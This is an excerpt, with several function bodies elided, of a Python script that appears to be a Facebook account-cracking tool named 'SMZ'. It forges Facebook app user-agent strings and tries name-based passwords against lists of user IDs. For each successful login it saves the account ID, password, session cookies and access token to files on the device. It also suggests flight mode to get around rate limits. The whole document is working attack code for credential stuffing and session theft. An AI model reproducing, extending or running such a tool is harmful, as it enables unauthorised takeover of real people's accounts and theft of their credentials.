...
def ua1():
    ...
    ua = f"Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)};  Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)})"+"[FBAN/"+"FB4A;FBAV/"+str(random.randint(11,77))+".0.0."+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/223.0.0.330;FBBV/924202270;FBDM/{density=23.0,width=6480,height=11200};FBLC/en_BD;FBRV/662382680;FBCR/DhakaCityV23;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S923U;FBSV/33;nullFBCA/armeabi-v29a:armeabi-v28a;]"
    return ua    

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
sys.stdout.write('\x1b]2; SMZ\x07')
####@-----Folder-----@####
try:os.mkdir('/sdcard/SMZ')
except:pass
try:
...
class iAmMain:
	...
	def file_menu(self):
		logo()
		file = input('[?] Put file path\033[1;2m: ')
		try:
	...
	def password_menu(self,id):
		...
		logo()
		p("[•] Total Ids  : \033[1;2m%s "%(str(len(id))))
		p(f'{R}[•] Use Flight Mode For Speed Up')
		line()
	...
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write(f"\r\033[1;0m[SMZ-M1] %s | {green}OK:%s "%(loop,len(ok)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
			...
			for ps in pwx:
				...
				if "session_key" in q:
					...
					p('\r\r\033[1;2m [SMZ-OK] '+uid+' | '+pas+' | '+asha(uid)+'\033[1;32m')
					#
					ok.append(uid)
					open('/sdcard/SMZ-OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SMZ-COOKIES.txt','a').write(uid+'|'+pw+'|'+coki+'\n')
					livechk("[•]"+uid+"|"+pw+"|"+coki) 
					break
	...
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write(f"\r\033[1;0m[SMZ-M2] %s | {green}OK:%s "%(loop,len(ok)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
			...
			for ps in pwx:
				...
				if "session_key" in q:
					token = q["access_token"]
					ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"sb={ssbb};{ckkk}"         
					p('\r\033[1;2m[SMZ-OK] %s | %s \033[1;97m '%(uid,pw))
					#
					ok.append(uid)
					open('/sdcard/SMZ-OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SMZ-COOKIES.txt','a').write(uid+'|'+pw+'|'+coki+'\n')
	...
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write(f"\r\033[1;0m[SMZ-M3] %s | {green}OK:%s "%(loop,len(ok)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
